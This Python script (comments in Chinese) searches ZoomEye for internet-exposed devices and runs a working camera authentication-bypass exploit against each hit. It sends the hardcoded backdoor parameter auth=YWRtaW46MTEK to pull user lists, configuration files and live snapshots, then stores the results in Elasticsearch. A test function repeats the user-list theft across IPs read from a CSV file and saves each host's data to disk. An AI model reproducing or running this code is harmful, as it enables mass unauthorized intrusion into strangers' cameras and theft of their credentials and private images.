# _*_ codign:utf8 _*_
"""====================================
@Author:Sadam·Sadik
@Email：1903249375@qq.com
@Date：2022/7/28
@Software: PyCharm
@disc:
======================================="""
import csv
import datetime
import http.client
import json
import math
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

import elasticsearch.exceptions
import requests
import urllib3.exceptions
from requests import ConnectTimeout

from secret import clientHM194
from utils import colorPrint

INDEX_DEVICE = "devices"
deviceQueue = Queue()


def save():
    try:
        clientHM194.indices.create(index=INDEX_DEVICE)
    except elasticsearch.exceptions.RequestError:
        pass
    while True:
        device: dict = deviceQueue.get()
        device.setdefault("createdAt", datetime.datetime.now())
        device.setdefault("updatedAt", datetime.datetime.now())
        scannedAt = datetime.datetime.strptime(device.pop("timestamp"), "%Y-%m-%d %H:%M")
        device.setdefault("scannedAt", scannedAt)
        ip = device.get('ip')
        deviceType: str = device.get("type")
        mappingType: str = device.get("mapping-type")
        token: str = device.get("token")
        scannable: bool = device.get("scannable")
        deviceOS: str = device.get("os")
        honeypot = device.get("honeypot")
        sensitive: bool = device.get("sensitive_data")
        ipMalware = device.get("ip_malware")
        txtFile: str = device.get("txtfile")
        ico: str = device.get("ico")
        jarm: str = device.get("jarm")
        ssl: str = device.get("ssl")
        geoInfo: dict = device.get("geoinfo")
        country: dict = geoInfo.get("country")
        base_station: str = geoInfo.get("base_station")
        city: dict = geoInfo.get("city")
        isp: str = geoInfo.get("isp")
        idc: str = geoInfo.get("idc")
        asn: str = geoInfo.get('asn')
        org: str = geoInfo.get('organization')
        subdivision: dict = geoInfo.get("subdivisions")
        portInfo: dict = device.pop('portinfo')
        device.setdefault("ports", [portInfo])
        # 去掉过于长的html文本字段，不需要保存实时获取即可
        rhtml: str = device.pop("rhtml")
        rawData: str = device.pop("raw_data")
        searchResp = clientHM194.search(index=INDEX_DEVICE, query={
            "term": {
                "ip.keyword": {
                    "value": ip
                }
            }
        })

        searchHits: dict = searchResp.get("hits")
        searchTotal = searchHits.get("total").get("value")
        if searchTotal > 0:
            # TODO:查看一下是不是端口不一样，或者设备本身就不一样了，如果端口不一样就新增端口
            hits: list[dict] = searchHits.get("hits")
            hit = hits[0]
            source: dict = hit.get("_source")
            oldScannedAt = datetime.datetime.strptime(source.get("scannedAt"), "%Y-%m-%dT%H:%M:%S")
            portsFromSource: list[dict] = source.get("ports")
            for oldPortInfo in portsFromSource:
                port: int = portInfo.get("port")
                oldPort = oldPortInfo.get("port")
                if port == oldPort:
                    if oldScannedAt >= scannedAt:
                        pass
                    else:
                        # TODO：更新
                        # updateResp = clientHM194.update()
                        colorPrint.red(f"发现了一个目标[{ip}:{port}]需要更新[上一次扫描：{oldScannedAt}，最新一次扫描：{scannedAt}]")
                        return
                else:
                    _id = hit.get("_id")
                    source.setdefault("updatedAt", datetime.datetime.now())
                    source.setdefault("scannedAt", scannedAt)
                    portsFromSource.append(portInfo)
                    source.setdefault("ports", portsFromSource)
                    try:
                        updateResp: dict = clientHM194.update(index=INDEX_DEVICE, id=_id, doc=source)
                        updateResult = updateResp.get("result")
                        if updateResult == "updated":
                            return
                        else:
                            raise Exception("更新失败：" + json.dumps(updateResp, ensure_ascii=False, indent=4))
                    except elasticsearch.exceptions.RequestError as e:
                        raise Exception("更新失败：" + str(e) + json.dumps(source, ensure_ascii=False, indent=4))
                    except Exception as e:
                        raise Exception("更新失败：" + str(e) + json.dumps(source, ensure_ascii=False, indent=4))
        else:
            indexResp = clientHM194.index(index=INDEX_DEVICE, document=device, timeout="10m")
            indexResult = indexResp.get("result")
            if indexResult == "created":
                return
            else:
                raise Exception("新增失败：" + json.dumps(indexResp, ensure_ascii=False, indent=4))


def handle(match: dict):
    ip = match.get("ip")
    portInfo = match.get("portinfo")
    port = portInfo.get("port")
    target = f"{ip}:{port}"
    securityUsersURL = f"http://{target}/Security/users?auth=YWRtaW46MTEK"
    try:
        startedAt = time.time()
        resp = requests.get(url=securityUsersURL)
        if resp.status_code == 200:
            portInfo.setdefault("usersXml", time.time() - startedAt)
            startedAt = time.time()
            resp1 = requests.get(f"http://{target}/System/configurationFile?auth=YWRtaW46MTEK")
            if resp1.status_code == 200:
                portInfo.setdefault("conf", time.time() - startedAt)
                imageUrl = f"http://{target}/onvif-http/snapshot?auth=YWRtaW46MTEK"
                startedAt = time.time()
                resp2 = requests.get(url=imageUrl, timeout=5 * 60)
                if resp2.status_code == 200:
                    if resp2.headers.get("Content-Type") == "image/jpeg":
                        portInfo.setdefault("snapshot", time.time() - startedAt)
                        colorPrint.green(f"{target} SNAPSHOT OK {imageUrl}")
                    else:
                        # TODO:是一个登陆网页的情况处理一下（例如：GPON Home Gateway Login）
                        pass
                else:
                    colorPrint.blue(f"{target} SNAPSHOT ERROR（{resp2.status_code})")
            else:
                colorPrint.red(f"{target} ConfigurationFile ERROR（{resp1.status_code}）.")
        else:
            colorPrint.red(f"{target} UsersXML ERROR（{str(resp.status_code)}）")
    except ConnectTimeout:
        colorPrint.red(f"{target} TimeOut")
    except urllib3.exceptions.ProtocolError as e:
        colorPrint.yellow(f"{target} ProtocolError")
    except requests.exceptions.ConnectionError as e:
        colorPrint.red(f"{target} ConnectionError.")
    except http.client.RemoteDisconnected as e:
        colorPrint.red(f"{target} RemoteDisconnected.")
    except Exception as e:
        colorPrint.red(f"{target} UNKNOWN ERROR({str(e)}).")
    deviceQueue.put(match)


def get(cubeAuthorizationToken: str, cookie_jsluid_s: str,
        cookie_SECKEY_ABVK: str,
        cookie_BMAP_SECKEY: str, q: str = "", page: int = 1, pageSize: int = 20):
    resp = requests.get(url="https://www.zoomeye.org/search", params={
        "q": q,
        "page": page,
        "pageSize": pageSize,
        "t": "v4+v6+web"
    }, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br",
        "Cube-Authorization": cubeAuthorizationToken,
        "Connection": "keep-alive",
        "Referer": "https://www.zoomeye.org/searchResult?q=%22Last-Modified%3A%20Tue%2C%2017%20May%202016%2010%3A22%3A58%20GMT%22%20%22Last-Modified%3A%20Thu%2C%2024%20Mar%202016%2005%3A58%3A21%20GMT%22%20%22Last-Modified%3A%20Thu%2C%2019%20Mar%202015%2009%3A24%3A20%20GMT%22%20%2Bcountry%3A%22US%22&page=11&pageSize=20",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }, cookies={
        "__jsluid_s": cookie_jsluid_s,
        "SECKEY_ABVK": cookie_SECKEY_ABVK,
        "BMAP_SECKEY": cookie_BMAP_SECKEY,
    })
    resp_json = resp.json()
    statusCode: int = resp_json.get("status")
    if statusCode == 401:
        colorPrint.red("Login Required. Go to:https://www.zoomeye.org")
        os.abort()
    elif statusCode == 200:
        matches: list[dict] = resp_json.get("matches")
        for match in matches:
            # threading.Thread(target=handle, args=(match,)).start()
            handle(match)
        # handle(matches[0])
    else:
        colorPrint.red(f"HTTP({statusCode}):" + resp_json.get("msg"))


def scan(
        cubeAuthorizationToken: str,
        cookie_jsluid_s: str,
        cookie_SECKEY_ABVK: str,
        cookie_BMAP_SECKEY: str,
        q: str = "", pageSize: int = 20, maxCount: int = 400
):
    threading.Thread(target=save).start()
    pool = ThreadPoolExecutor(max_workers=1)
    for p in range(1, math.ceil(maxCount / pageSize)):
        pool.submit(get, cubeAuthorizationToken, cookie_jsluid_s, cookie_SECKEY_ABVK, cookie_BMAP_SECKEY, q, p,
                    pageSize, )


def test():
    cr = csv.reader(open("./targets/glory.csv", encoding="utf-8", mode="r"))
    next(cr)  # 过滤掉首行
    for row in cr:
        ip = row[0]
        port = row[1]
        if port == "":
            port = 80
        target = f"{ip}:{port}"
        resp = requests.get(url=f"http://{target}/Security/users?auth=YWRtaW46MTEK")
        if resp.status_code == 200:
            with open(f"./targets/Security-users/{ip}-{port}.xml", "wb") as f:
                f.write(resp.content)
                print(target, "ok")
        else:
            print(target, "ERROR")
